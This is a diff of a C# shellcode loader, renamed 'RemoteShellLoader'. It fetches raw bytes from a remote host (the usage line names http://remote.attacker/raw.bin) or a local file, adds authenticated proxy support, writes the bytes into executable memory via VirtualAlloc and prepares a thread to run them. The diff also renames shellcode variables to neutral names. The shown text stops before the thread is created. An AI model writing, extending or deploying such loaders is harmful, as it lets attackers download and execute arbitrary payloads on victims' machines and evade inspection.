@@ -5,17 +5,64 @@ using System.IO;
 using System.Net;
 using System.Threading;
 
-namespace ShellcodeLoader
+namespace RemoteShellLoader
 {
     class Program
     {
-        static byte[] GetTextWeb(string url, int retry, int timeout)
+        static private WebProxy GetProxy(string proxy)
+        {
+            // remove [http://]<user>:<pass>@<ip>:<port> if present
+            if (proxy.StartsWith("http://"))
+            {
+                proxy = proxy.Remove(0, 7);
+            }
+
+            string uri;
+            string[] creds = null;
+
+            if (proxy.Contains("@"))
+            {
+                // Separate <user>:<pass> @ <ip>:<port>
+                string[] splitd = proxy.Split('@');
+                creds = splitd[0].Split(':');
+                uri = splitd[1];
+            }
+            else
+                uri = proxy;
+
+            Console.WriteLine("{0}", uri);
+
+            WebProxy wp = new WebProxy(new Uri("http://" + uri));
+
+            if (creds != null)
+            {
+                wp.Credentials = new NetworkCredential(creds[0], creds[1]);
+                wp.UseDefaultCredentials = false;
+            }
+
+            return wp;
+        }
+
+        static private void usage() {
+            Console.WriteLine("{0} [/proxy:[user:pass@]<ip>:<port>] http://remote.attacker/raw.bin");
+            Console.WriteLine("{0} C:\\path\\to\\file\\raw.bin");
+            Environment.Exit(-1);
+        }
+
+        static byte[] GetTextWeb(string url, int retry, int timeout, string proxy = null)
         {
             Console.WriteLine($"{url}");
 
             // If https desired
             // ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             WebClient client = new WebClient();
+
+            if (proxy != null)
+            {
+                Console.WriteLine("[+] Using proxy {0}", proxy);
+                client.Proxy = GetProxy(proxy);
+            }
+
             byte[] str = null;
             while (retry >= 0 && str == null)
             {
@@ -23,10 +70,16 @@ namespace ShellcodeLoader
                 {
                     str = client.DownloadData(url);
                 }
-                catch (WebException ex)
+                catch (WebException ex) when (ex.Status is WebExceptionStatus.Timeout)
                 {
+                    Console.WriteLine("[-] {0} timed out, retrying...", url);
                     retry--;
                     Thread.Sleep(timeout * 10000);
+                }
+                catch (WebException ex)
+                {
+                    Console.WriteLine("[-] Error: {0} - {1}.", url, ex.Status);
+                    break;
                 }
             }
             if (str == null)
@@ -38,36 +91,50 @@ namespace ShellcodeLoader
         }
         static void Main(string[] args)
         {
-            if (args.Length < 1)
+            var parsed = ArgumentParser.Parse(args);
+            if (parsed.ParsedOk == false)
             {
-                Console.WriteLine("Missing bin file");
-                return;
+                usage();
             }
-            var file = args[0];
-            byte[]  x64shellcode;
-            if (file.StartsWith("http"))
+
+            if (! parsed.Arguments.ContainsKey("/file"))
             {
-                x64shellcode = GetTextWeb(file, 3, 1);
+                usage();
+            }
+
+            string proxy = null;
+            if (parsed.Arguments.ContainsKey("/proxy"))
+            {
+                proxy = parsed.Arguments["/proxy"];
+            }
+
+
+
+            var file = parsed.Arguments["/file"];
+            byte[]  text;
+            if (file.StartsWith("http://"))
+            {
+                text = GetTextWeb(file, 3, 1, proxy);
             } else
             {
                 var fs = new FileStream(file, FileMode.Open);
                 var len = (int)fs.Length;
-                x64shellcode = new byte[len];
-                fs.Read(x64shellcode, 0, len);
+                text = new byte[len];
+                fs.Read(text, 0, len);
             }
 
-            if (x64shellcode.Length == 0)
+            if (text.Length == 0)
             {
-                Console.WriteLine("Couldn't get shell bytes");
+                Console.WriteLine("[-] Couldn't get bytes");
                 return;
             }
             
             IntPtr funcAddr = VirtualAlloc(
                               IntPtr.Zero,
-                              (ulong)x64shellcode.Length,
+                              (ulong)text.Length,
                               (uint)StateEnum.MEM_COMMIT,
                               (uint)Protection.PAGE_EXECUTE_READWRITE);
-            Marshal.Copy(x64shellcode, 0, (IntPtr)(funcAddr), x64shellcode.Length);
+            Marshal.Copy(text, 0, (IntPtr)(funcAddr), text.Length);
 
             IntPtr hThread = IntPtr.Zero;
             uint threadId = 0;
